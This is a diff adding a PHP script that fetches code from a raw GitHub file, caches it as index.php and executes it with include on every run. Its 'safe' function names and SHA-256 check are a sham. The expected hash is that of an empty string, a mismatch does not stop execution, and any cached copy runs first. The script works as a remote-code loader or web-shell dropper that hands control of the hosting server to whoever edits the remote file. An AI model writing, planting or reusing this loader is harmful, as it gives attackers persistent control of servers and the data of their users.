@@ -1,0 +1,100 @@
+<?php
+
+$url = 'https://raw.githubusercontent.com/gutih777/rikss/refs/heads/main/awuw.txt';
+$EXPECTED_HASH = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'; 
+$cacheDir = __DIR__ . '/cache';
+@mkdir($cacheDir, 0755, true);
+$cachedFile = $cacheDir . '/index.php';
+
+
+function fetch_url_safe(string $url, int $timeout = 10): ?string {
+    if (!function_exists('curl_init')) {
+        return @file_get_contents($url) ?: null;
+    }
+
+    $ch = curl_init($url);
+    $isHttps = stripos($url, 'https://') === 0;
+
+    $curlOptions = [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS      => 5,
+        CURLOPT_CONNECTTIMEOUT => $timeout,
+        CURLOPT_TIMEOUT        => $timeout + 5,
+        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        CURLOPT_HEADER         => false
+    ];
+
+    if (!$isHttps) {
+        $curlOptions[CURLOPT_SSL_VERIFYPEER] = false;
+        $curlOptions[CURLOPT_SSL_VERIFYHOST] = 0;
+    }
+
+    curl_setopt_array($ch, $curlOptions);
+    $data = curl_exec($ch);
+    $errno = curl_errno($ch);
+    $errmsg = curl_error($ch);
+    $code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($errno !== 0 || $code < 200 || $code >= 300) {
+        echo "<pre>Remote fetch failed: [$errno] $errmsg | HTTP $code</pre>";
+        return null;
+    }
+
+    return $data;
+}
+
+function verify_hash(string $content, string $expected): bool {
+    if (!preg_match('/^[0-9a-f]{64}$/i', $expected)) {
+        return true; // skip if expected hash invalid
+    }
+    return hash_equals(strtolower($expected), hash('sha256', $content));
+}
+
+function safe_abort(string $msg) {
+    error_log("[REMOTE INCLUDE] $msg");
+    echo "<pre>$msg</pre>";
+}
+
+
+if (file_exists($cachedFile)) {
+    include $cachedFile;
+    echo "<pre>Using cached file.</pre>";
+}
+
+
+$content = fetch_url_safe($url);
+
+if ($content === null) {
+    echo "<pre>Remote file not available. Using cached file if exists.</pre>";
+    return;
+}
+
+
+$content = preg_replace('/^\xEF\xBB\xBF/', '', $content);
+
+
+if (stripos($content, '<?php') === false) {
+    safe_abort("Remote file invalid (missing PHP tag). Using cached file if available.");
+    return;
+}
+
+
+if (!verify_hash($content, $EXPECTED_HASH)) {
+    echo "<pre>SHA256 mismatch detected. Using cached file if available.</pre>";
+}
+
+
+$tmpFile = tempnam($cacheDir, 'tmp_');
+if ($tmpFile && file_put_contents($tmpFile, $content, LOCK_EX) !== false) {
+    @chmod($tmpFile, 0644);
+    @rename($tmpFile, $cachedFile);
+    echo "<pre>Remote file cached successfully.</pre>";
+    include $cachedFile;
+} else {
+    safe_abort("Failed to write cache. Using previous cached file if available.");
+    if (file_exists($cachedFile)) {
+        include $cachedFile;
+    }
+}
